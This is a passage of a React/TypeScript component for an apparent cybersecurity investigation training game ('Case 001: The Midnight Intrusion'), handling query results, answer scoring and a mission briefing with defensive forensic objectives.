  const [score, setScore] = useState(0);
  const [ranQuery, setRanQuery] = useState<string | null>(null);
  const [selectedAnswer, setSelectedAnswer] = useState<string | null>(null);
  const [attemptedCurrentStep, setAttemptedCurrentStep] = useState(false);
  
  const currentStepData = investigationSteps[investigationStep];

  const handleRunQuery = (queryId: string) => {
    setRanQuery(queryId);
    const queryResult = currentStepData.queryResults[queryId as keyof typeof currentStepData.queryResults];
    if (queryResult) {
      setResults(queryResult);
    } else {
      setResults({ data: [], columns: ['Result'] });
    }
  };

  const handleAnswerSubmit = () => {
    if (!selectedAnswer) return;

    const isCorrect = selectedAnswer === currentStepData.correctAnswerId;

    if (isCorrect) {
      toast({
        title: "Correct!",
        description: "You've found the right information. Moving to the next step...",
      });
      if (!attemptedCurrentStep) {
        setScore(prev => prev + 50);
      }
      
      if (investigationStep < investigationSteps.length - 1) {
          setTimeout(() => {
              setInvestigationStep(prev => prev + 1);
              setRanQuery(null);
              setSelectedAnswer(null);
              setResults({data: [], columns: []});
              setAttemptedCurrentStep(false);
          }, 2000);
      } else {
          setTimeout(() => {
              setActiveView('report');
          }, 2000);
      }
    } else {
      toast({
        variant: "destructive",
        title: "Incorrect Answer",
        description: "That's not right. Review the query results and the hint, then try again.",
      });
      if (!attemptedCurrentStep) {
          setScore(prev => Math.max(0, prev - 10)); // Penalize for wrong answer on first try
      }
    }

    if (!attemptedCurrentStep) {
      setAttemptedCurrentStep(true);
    }
  };
  
  const renderContent = () => {
    switch (activeView) {
      case 'investigation':
        return <InvestigationView
            stepData={currentStepData}
            onRunQuery={handleRunQuery}
            results={results}
            onAnswerSubmit={handleAnswerSubmit}
            selectedAnswer={selectedAnswer}
            setSelectedAnswer={setSelectedAnswer}
            ranQuery={ranQuery}
        />;
      case 'report':
        return <ReportView score={score} />;
      case 'briefing':
      default:
        return (
          <Card className="m-4">
            <CardHeader>
              <CardTitle className="text-2xl font-headline">Case 001: The Midnight Intrusion</CardTitle>
              <CardDescription>On October 25th, 2023, our systems detected anomalous activity. Your mission is to follow the digital trail to uncover the full story of the breach.</CardDescription>
            </CardHeader>
            <CardContent>
              <h3 className="mb-4 text-lg font-semibold">Overall Mission Objectives:</h3>
              <ul className="list-disc space-y-2 pl-5">
                <li>Identify the compromised user account and initial vector.</li>
                <li>Trace the attacker's lateral movement across the network.</li>
                <li>Determine the full scope of the data breach and system impact.</li>
                <li>Uncover all persistence mechanisms.</li>
                <li>Document your findings in a final report.</li>
              </ul>
            </CardContent>
          </Card>
        );
    }
  };

  return (
    <SidebarProvider>
      <Sidebar>
        <InvestigationNav activeStep={activeView} setActiveStep={setActiveView} score={score} />
      </Sidebar>
      <SidebarInset>
        <div className="min-h-screen">
          {renderContent()}
        </div>
      </SidebarInset>
    </SidebarProvider>
  );
}
